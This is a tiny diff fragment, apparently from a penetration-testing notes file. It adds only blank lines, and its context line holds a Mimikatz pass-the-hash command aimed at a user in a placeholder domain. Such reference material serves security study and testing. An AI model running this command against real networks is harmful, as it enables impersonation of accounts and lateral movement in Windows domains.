@@ -17,3 +17,5 @@ updated_at: '2023-05-29T16:48:52.884824+00:00'
 sekurlsa::pth /user:itstaff /domain:evilcorp.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0
 
 ```
+
+
